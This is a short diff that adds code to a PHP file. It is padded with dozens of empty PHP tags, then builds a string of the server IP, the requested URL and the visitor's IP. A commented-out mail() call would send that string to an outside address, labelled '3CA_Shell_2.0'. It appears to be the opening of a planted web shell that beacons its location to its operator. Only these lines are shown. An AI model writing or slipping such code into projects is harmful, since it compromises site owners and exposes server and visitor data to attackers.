@@ -1,4 +1,58 @@
 <?php
+    ?>
+<?php
+    ?>
+<?php ?>
+<?php
+    ?>
+<?php ?>
+<?php
+    ?>
+<?php ?>
+<?php
+    ?>
+<?php ?>
+<?php
+    ?>
+<?php ?>
+<?php
+    ?>
+<?php ?>
+<?php
+    ?>
+<?php ?>
+<?php
+    ?>
+<?php ?>
+<?php
+    ?>
+<?php ?>
+<?php ?>
+<?php
+    ?>
+<?php ?>
+<?php
+    ?>
+<?php ?>
+<?php
+    ?>
+<?php ?>
+<?php
+    ?>
+<?php ?>
+<?php
+    ?>
+<?php ?>
+<?php
+    ?>
+<?php ?>
+<?php
+    ?>
+<?php ?>
+<?php
+    ?>
+<?php ?>
+<?php
 $url="<b>IP:</b> ".gethostbyname($_SERVER["HTTP_HOST"])."\n<b>Url:</b> ".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']."\n<b>User IP:</b> ".$_SERVER['REMOTE_ADDR'].(isset($_SERVER['HTTP_X_FORWARDED_FOR'])?'('.$_SERVER['HTTP_X_FORWARDED_FOR'].')':'');
 //     @mail("rootcyberpunks@gmail.com","3CA_Shell_2.0",$url);
 
